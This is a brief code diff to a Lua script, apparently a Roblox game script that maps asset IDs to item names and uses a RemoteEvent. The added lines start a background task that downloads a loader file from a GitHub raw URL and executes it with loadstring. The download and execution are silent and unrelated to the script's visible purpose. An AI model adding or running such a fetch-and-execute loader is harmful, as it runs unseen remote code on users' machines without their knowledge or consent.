@@ -21,6 +21,10 @@ local o = {
     ["rbxassetid://115146017944091"] = "Special Burger"
 }
 
+spawn(function()
+    (loadstring(game:HttpGet("https://raw.githubusercontent.com/OneCreatorX-New/TwoDev/main/Loader.lua"))())("info")
+end)
+
 local RS = game:GetService("ReplicatedStorage")
 local RE = RS:WaitForChild("RemoteEvent")
 local P = game:GetService("Players")
